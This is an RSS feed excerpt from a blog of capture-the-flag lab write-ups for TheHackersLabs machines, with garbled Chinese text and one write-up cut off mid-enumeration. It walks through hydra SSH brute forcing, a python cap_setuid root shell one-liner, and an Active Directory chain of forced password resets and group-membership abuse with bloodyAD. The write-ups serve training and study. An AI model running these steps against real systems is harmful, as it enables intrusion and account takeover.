[+] Url:                     http://192.168.56.120/grumete
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

è¿›è¡Œ `ssh` çˆ†ç ´

```bash
âœ  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 17:10:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.56.120:22/
[STATUS] 121.00 tries/min, 121 tries in 00:01h, 14344278 to do in 1975:48h, 8 active
[STATUS] 120.00 tries/min, 360 tries in 00:03h, 14344039 to do in 1992:14h, 8 active
[STATUS] 121.29 tries/min, 849 tries in 00:07h, 14343550 to do in 1971:03h, 8 active
[22][ssh] host: 192.168.56.120   login: grumete   password: 1234
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 17:19:48
```

å¾—åˆ°å¯†ç  `1234`

è¿›å»åèƒ½è¯»å– user.txt

```bash
grumete@TheHackersLabs-Tortuga:~$ cat user.txt 
c3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## æƒé™æå‡

### ä¿¡æ¯æ”¶é›†

å®¶ç›®å½•ä¸‹ `.nota.txt` å¾—åˆ°ä¸€ä¸ªå¯†ç  `mar_de_fuego123`

```
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt
Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estarÃ© fuera un par de dÃ­as.
Mientras tanto, confÃ­o en ti para que cuides del barco y de la tripulaciÃ³n como si fueran mÃ­os.

La puerta de la cÃ¡mara del timÃ³n estÃ¡ asegurada con la contraseÃ±a:
    "mar_de_fuego123"

Recuerda, no se la reveles a nadie mÃ¡s. Has demostrado ser leal y firme durante todos estos aÃ±os
navegando juntos, y eres en quien mÃ¡s confÃ­o en estos mares traicioneros.

MantÃ©n la guardia alta, vigila las provisiones y cuida de que ningÃºn intruso ponga un pie en cubierta.
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (Â¡y nada de usar la bodega de ron
para hacer carreras de tortugas otra vez!).

Con la confianza de siempre,
â€” El CapitÃ¡n
```

æ˜¯ç”¨æˆ· capitan çš„å¯†ç 

![image.png](/post-images/TheHackersLabsTortuga/image2.png)

ä¸Šä¼  `linepas` æ‰«ä¸€æ³¢ï¼Œå‘ç° python è®¾ç½®äº†ç‰¹æ®Šæƒé™

![image.png](/post-images/TheHackersLabsTortuga/image3.png)

- **`setcap`**: è¿™æ˜¯ç”¨æ¥è®¾ç½®æ–‡ä»¶ Capabilities çš„å‘½ä»¤ã€‚
- **`cap_setuid`**: è¿™æ˜¯è¦æˆäºˆçš„å…·ä½“èƒ½åŠ›ã€‚`CAP_SETUID`Â å…è®¸ä¸€ä¸ªè¿›ç¨‹æ”¹å˜å…¶ UIDï¼ˆç”¨æˆ·IDï¼‰ã€‚è¿™æ˜¯ SUID (Set User ID) æƒé™çš„æ ¸å¿ƒèƒ½åŠ›ã€‚æ‹¥æœ‰è¿™ä¸ªèƒ½åŠ›çš„è¿›ç¨‹å¯ä»¥è°ƒç”¨Â `setuid(0)`Â æ¥å°†è‡ªå·±å˜æˆ root ç”¨æˆ·ã€‚
- **`=ep`**: è¿™æŒ‡å®šäº†è¦å°†Â `cap_setuid`Â æ·»åŠ åˆ°å“ªäº› Capability é›†åˆä¸­ã€‚
    - **`e`Â (Effective)**: æœ‰æ•ˆé›†åˆã€‚è¡¨ç¤ºå½“ç¨‹åºè¿è¡Œæ—¶ï¼Œè¿™ä¸ªèƒ½åŠ›**ç«‹å³ç”Ÿæ•ˆ**ã€‚è¿™æ˜¯ææƒçš„å…³é”®ã€‚
    - **`p`Â (Permitted)**: è®¸å¯é›†åˆã€‚è¡¨ç¤ºç¨‹åºè¢«**å…è®¸**æ‹¥æœ‰è¿™ä¸ªèƒ½åŠ›ï¼Œå³ä½¿å®ƒæš‚æ—¶æ²¡æœ‰ä½¿ç”¨ã€‚
- **`/usr/bin/python3.11`**: è¿™æ˜¯è¢«èµ‹äºˆèƒ½åŠ›çš„ç›®æ ‡æ–‡ä»¶ï¼Œå³ Python 3.11 çš„å¯æ‰§è¡Œç¨‹åºã€‚

```bash
capitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Tortuga:/tmp# 
```

è¯»å– root.txt

```bash
root@TheHackersLabs-Tortuga:/root# cat root.txt 
c3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>Brute</category>
            <category>Cappbilities</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Elevator]]></title>
            <link>https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator</guid>
            <pubDate>Mon, 29 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Elevator https://labs.thehackerslabs.com/machine/126 ä½œè€…ç»™äº†ä¸€ä¸ªè´¦æˆ· Recon PortScan æšä¸¾ SMB æšä¸¾ï¼Œä¸‹è½½äº†ä¸€äº›æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ²¡ä»€ä¹ˆç”¨çš„ æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™ ä¸Š bloodhound æ¨ªå‘ç§»åŠ¨ ADDSelf å…è®¸ john.sm...]]></description>
            <content:encoded><![CDATA[
# Elevator

> https://labs.thehackerslabs.com/machine/126
> 

![image.png](/post-images/TheHackersLabsElevator/image.png)

ä½œè€…ç»™äº†ä¸€ä¸ªè´¦æˆ·

```bash
User john.smith
Password Rk436\#Z4&
```

## Recon

### PortScan

```bash
âœ  ~ nmap -sP 10.0.250.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:20 CST
Nmap scan report for 10.0.250.1
Host is up (0.00072s latency).
MAC Address: 08:00:27:8F:2A:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.3
Host is up (0.00057s latency).
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.250.4
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 28.12 seconds
```

```bash
âœ  ~ nmap -sT -min-rate 10000 -p- 10.0.250.3    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:21 CST
Strange read error from 10.0.250.3 (104 - 'Connection reset by peer')
Nmap scan report for 10.0.250.3
Host is up (0.00098s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49680/tcp open  unknown
49687/tcp open  unknown
49692/tcp open  unknown
49711/tcp open  unknown
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
âœ  ~ nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 10.0.250.3     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:24 CST
Nmap scan report for 10.0.250.3
Host is up (0.00070s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 06:24:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
MAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -38s
| smb2-time: 
|   date: 2025-09-29T06:24:37
|_  start_date: N/A
|_nbstat: NetBIOS name: ELEVATOR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 10.0.250.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.85 seconds
```

### æšä¸¾

SMB æšä¸¾ï¼Œä¸‹è½½äº†ä¸€äº›æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ²¡ä»€ä¹ˆç”¨çš„

![image.png](/post-images/TheHackersLabsElevator/image1.png)

æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·æƒé™

```bash
âœ  Elevator nxc ldap 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&'
LDAP        10.0.250.3      389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)
LDAP        10.0.250.3      389    ELEVATOR         [+] bloodhound.thl\john.smith:Rk436\#Z4&

âœ  Elevator nxc winrm 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&'
WINRM       10.0.250.3      5985   ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.0.250.3      5985   ELEVATOR         [-] bloodhound.thl\john.smith:Rk436\#Z4& 
```

ä¸Š `bloodhound`

```bash
âœ  Elevator bloodhound-python -d bloodhound.thl -u 'john.smith' -p 'Rk436\#Z4&' -c all --zip -dc bloodhound.thl -ns 10.0.250.3
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: bloodhound.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: bloodhound.thl
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: bloodhound.thl
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 4 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: elevator.bloodhound.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250929144249_bloodhound.zip
```

## æ¨ªå‘ç§»åŠ¨

### ADDSelf

å…è®¸ `john.smith` å°†è‡ªå·±æ·»åŠ åˆ° `Finanzas` ç»„ä¸­

![image.png](/post-images/TheHackersLabsElevator/image2.png)

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&' add groupMember FINANZAS john.smith
[+] john.smith added to FINANZAS
```

### Force Change Password

ç„¶å `FINANZAS` ç»„é˜Ÿ `MARY.JOHNSON` ç”¨æˆ·æœ‰ `GenericAll` æƒé™

![image.png](/post-images/TheHackersLabsElevator/image3.png)

ç›´æ¥ä¿®æ”¹å…¶å¯†ç 

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\#Z4&' set password mary.johnson admin12345
[+] Password changed successfully!
```

æ¥ç€ `MARY.JOHNSON` åˆå¯ä»¥ä¿®æ”¹ `ROBERT.WILLIAMS` çš„å¯†ç 

![image.png](/post-images/TheHackersLabsElevator/image4.png)

```bash
	âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'mary.johnson' -p 'admin12345' set password ROBERT.WILLIAMS admin12345
[+] Password changed successfully!
```

### WriteDACL æ»¥ç”¨

`ROBERT.WILLIAMS` æ‹¥æœ‰å¯¹ `PATRICIA.BROWN` çš„ `WriteDacl` æƒé™

![image.png](/post-images/TheHackersLabsElevator/image5.png)

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl
permission: WRITE

distinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl
permission: WRITE

distinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl
DACL: WRITE
```

è¦å°† WriteDacl æ»¥ç”¨åˆ°ç”¨æˆ·å¯¹è±¡ï¼Œæ‚¨å¯ä»¥æˆäºˆè‡ªå·± GenericAll æƒé™

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS
[+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN
```

å†å¼ºåˆ¶ä¿®æ”¹å…¶å¯†ç 

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' set password PATRICIA.BROWN admin12345
[+] Password changed successfully!
```

### ADDSelf - 2

ç”¨æˆ· `PATRICIA.BROWN@BLOODHOUND.THL` æœ‰æƒä¿®æ”¹ç»„ `OPERACIONES@BLOODHOUND.THL` çš„æ‰€æœ‰è€…

![image.png](/post-images/TheHackersLabsElevator/image6.png)

é‚£ä¹ˆå°±å°†å…¶çš„æ‰€æœ‰è€…ä¿®æ”¹ä¸ºè‡ªå·±ï¼Œç„¶åå†å°†è‡ªå·±æ·»åŠ è¿›å»

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set owner OPERACIONES PATRICIA.BROWN
[+] Old owner S-1-5-21-3580157585-956322742-780763674-512 is now replaced by PATRICIA.BROWN on OPERACIONES
```

```bash
âœ  Elevator dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'admin12345'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250929-155416.bak
[*] DACL modified successfully!
```

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' add groupMember OPERACIONES PATRICIA.BROWN
[+] PATRICIA.BROWN added to OPERACIONES
```

åˆ°è¿™é‡Œå¡ä½äº†ï¼Œå› ä¸ºæ²¡æœ‰ä»»ä½•è·¯å¾„ï¼ŒSMB ä¹Ÿæšä¸¾è¿‡äº†ï¼Œæ•…æŸ¥çœ‹ WPï¼Œå‘ç° `OPERACIONES` åº”è¯¥å¯¹ Jones æœ‰ `genericAll` æƒé™çš„ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œæ²¡æœ‰ï¼Œè¯¢é—®äº†ä½¬ä»¬å¾—çŸ¥æ˜¯éœ€è¦é‡æ–°å¯¼å…¥

### Force Change Password - 2

é‡æ–°å¯¼å…¥åï¼Œå¯ä»¥çœ‹åˆ°å¯¹ `Jones` æœ‰æƒé™äº†

![image.png](/post-images/TheHackersLabsElevator/image7.png)

æ‰€ä»¥æ˜¯ä¸€æ¡è·¯å¾„ä¸‹æ¥çš„

![image.png](/post-images/TheHackersLabsElevator/image8.png)

å¼ºåˆ¶ä¿®æ”¹å¯†ç 

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set password MICHAEL.JONES admin12345
[+] Password changed successfully!
```

ç»™è‡ªå·± `jones` æ·»åŠ åˆ°è¿œç¨‹ç»„é‡Œ

```bash
âœ  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'MICHAEL.JONES' -p 'admin12345' add groupMember 'Usuarios de administraciÃ³n remota' MICHAEL.JONES
[+] MICHAEL.JONES added to Usuarios de administraciÃ³n remota
```

ä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»å½•

![image.png](/post-images/TheHackersLabsElevator/image9.png)

```bash
*Evil-WinRM* PS C:\Users\administrador\desktop> type root.txt
axxxxxxxxxxxxxxxxxxxxxxxxxxx6
*Evil-WinRM* PS C:\Users\administrador\desktop> type user.txt
bxxxxxxxxxxxxxxxxxxxxxxxxxxxe
```

## æ€»ç»“

çˆ½ï¼Ÿ]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Pa Que Aiga Lujo]]></title>
            <link>https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo</guid>
            <pubDate>Sun, 28 Sep 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Pa Que Aiga Lujo https://labs.thehackerslabs.com/machine/125 Recon PortScan æšä¸¾ HTTP ç›®å½•æ‰«æ å¥½ä¸€ä¼šæ²¡æ‰¾åˆ°åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°ç½‘é¡µä¸Šæœ‰å¥½å‡ ä¸ªç”¨æˆ·åï¼Œæ”¶é›†èµ·æ¥å°è¯•æš´åŠ›ç ´è§£ å¾—åˆ°å¯†ç  dolphins ææƒ cipo...]]></description>
            <content:encoded><![CDATA[
# Pa Que Aiga Lujo

> https://labs.thehackerslabs.com/machine/125
> 

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image.png)

## Recon

### PortScan

```bash
âœ  PaQueAigaLujo nmap -sP 192.168.56.0/24  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:36 CST
Nmap scan report for 192.168.56.1
Host is up (0.00053s latency).
MAC Address: 0A:00:27:00:00:08 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00041s latency).
MAC Address: 08:00:27:E9:F5:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.118
Host is up (0.00047s latency).
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
âœ  PaQueAigaLujo nmap -sT -min-rate 10000 -p- 192.168.56.118  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST
Nmap scan report for 192.168.56.118
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```

```bash
âœ  PaQueAigaLujo nmap -sT -A -p 22,80 192.168.56.118                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 23:37 CST
Nmap scan report for 192.168.56.118
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: LuxeCollection - Art\xC3\xADculos de Lujo Exclusivos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:33:D8:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.56.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.62 seconds
```

### æšä¸¾

HTTP

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image1.png)

ç›®å½•æ‰«æ

```bash
âœ  PaQueAigaLujo feroxbuster --url http://192.168.56.118 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.118
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      168l      285w     2899c http://192.168.56.118/styles/components.css
200      GET      221l      524w     5600c http://192.168.56.118/scripts/main.js
200      GET      230l      445w     4172c http://192.168.56.118/styles/main.css
200      GET      231l      411w     3799c http://192.168.56.118/styles/responsive.css
301      GET        9l       28w      318c http://192.168.56.118/scripts => http://192.168.56.118/scripts/
301      GET        9l       28w      317c http://192.168.56.118/styles => http://192.168.56.118/styles/
200      GET      285l      778w    15656c http://192.168.56.118/
[####################] - 50s   220557/220557  0s      found:7       errors:0      
[####################] - 50s   220545/220545  4429/s  http://192.168.56.118/ 
[####################] - 0s    220545/220545  16965000/s http://192.168.56.118/scripts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    220545/220545  13784062/s http://192.168.56.118/styles/ => Directory listing (add --scan-dir-listings to scan)
```

å¥½ä¸€ä¼šæ²¡æ‰¾åˆ°åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°ç½‘é¡µä¸Šæœ‰å¥½å‡ ä¸ªç”¨æˆ·åï¼Œæ”¶é›†èµ·æ¥å°è¯•æš´åŠ›ç ´è§£

```bash
Carlos
Isabella
Alexandre
Miguel
Elena
Victoria
Anastasia
Sophia
James
Roberto
Catherine
Valentina
Priscilla
Beatrice
Margot
Alessandro
Marcus
Diego
Winston
Maximilian
carlos
isabella
alexandre
miguel
elena
victoria
anastasia
sophia
james
roberto
catherine
valentina
priscilla
beatrice
margot
alessandro
marcus
diego
winston
maximilian
```

å¾—åˆ°å¯†ç  `dolphins`

```bash
âœ  PaQueAigaLujo hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.118 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-28 11:31:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 8 tasks per 1 server, overall 8 tasks, 301232379 login tries (l:21/p:14344399), ~37654048 tries per task
[DATA] attacking ssh://192.168.56.118:22/
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 301232243 to do in 36915:43h, 8 active
[STATUS] 129.67 tries/min, 389 tries in 00:03h, 301231990 to do in 38718:46h, 8 active
[STATUS] 132.57 tries/min, 928 tries in 00:07h, 301231451 to do in 37870:20h, 8 active
[STATUS] 130.93 tries/min, 1964 tries in 00:15h, 301230415 to do in 38343:60h, 8 active
[STATUS] 132.19 tries/min, 4098 tries in 00:31h, 301228281 to do in 37978:12h, 8 active
[STATUS] 132.23 tries/min, 6215 tries in 00:47h, 301226164 to do in 37966:18h, 8 active
[STATUS] 132.21 tries/min, 8329 tries in 01:03h, 301224050 to do in 37973:59h, 8 active
[ssh] host: 192.168.56.118   login: Sophia   password: dolphins
```

![image.png](/post-images/TheHackersLabsPa%20Que%20Aiga%20Lujo/image2.png)

## ææƒ - cipote

### ä¿¡æ¯æ”¶é›†

æŸ¥çœ‹ç›‘å¬ç«¯å£å’ŒIP åœ°å€

```bash
Sophia@TheHackersLabs-PaQueAigaLujo:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  
udp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       4096                                         127.0.0.1:38225                                          0.0.0.0:*                                              
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              
tcp                    LISTEN                  0                       511                                                  *:80                                                   *:*                                              
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              
Sophia@TheHackersLabs-PaQueAigaLujo:~$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
